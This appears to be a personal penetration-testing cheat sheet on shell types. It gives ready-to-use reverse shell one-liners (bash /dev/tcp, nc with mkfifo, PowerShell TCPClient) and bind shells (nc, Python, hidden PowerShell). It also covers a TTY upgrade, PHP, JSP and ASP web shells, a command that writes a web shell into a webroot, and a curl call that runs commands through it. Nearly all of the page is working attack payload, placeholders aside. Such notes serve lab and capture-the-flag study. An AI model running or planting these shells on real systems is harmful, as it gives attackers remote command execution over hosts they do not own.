# Reverse
- target host connects to us
```JavaScript
bash -c 'bash -i >& /dev/tcp/<IP>/<port> 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <port> >/tmp/f
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
```JavaScript
nc -lvnp <port>
```
  
# Bind
- we connect to target host
  
Start listener on target host with IP 0.0.0.0
- 0.0.0.0 makes it so any IP can connect to it
```JavaScript
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]<port>; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
  
once we have executed the bind shell command
```JavaScript
nc <IP> <port>
```
![image 186.png](../assets/Shell%20Types%20and%20Upgrades/image%20186.png)
  
## Upgrading TTY
```JavaScript
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
[Enter]
[Enter]
```
![image 1 139.png](../assets/Shell%20Types%20and%20Upgrades/image%201%20139.png)
![image 2 127.png](../assets/Shell%20Types%20and%20Upgrades/image%202%20127.png)
- shell won’t cover the entire terminal (this is what has happened to me before)
    
    - in order to fix this, we have to modify some variables
    
  
go into your terminal and input the following to get the correct value
```JavaScript
echo $TERM
stty size
```
  
now, back in the target machine, run the following
```JavaScript
export TERM=<term_value>
stty rows <row> columns <column>
```
  
  
# Web Shell
## PHP
```JavaScript
<?php system($_REQUEST["cmd"]); ?>
```
  
## JSP
```JavaScript
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
  
## ASP
```JavaScript
<% eval request("cmd") %>
```
  
## Uploading Web Shell
- Apache - /var/www/html
- Nginx - /usr/local/nginx/html
- C:\inetpub\wwwroot\
    
    - for some reason they use c:\ for this one (try this second i guess)
    
- C:\xampp\htdocs\
  
- can check directories to see what webroot is in use then use echo to write out our web shell
    
    - for example, in PHP
    
```JavaScript
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
  
## Accessing Web Shell
- go to directory
- use curl
```JavaScript
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
![image 3 114.png](../assets/Shell%20Types%20and%20Upgrades/image%203%20114.png)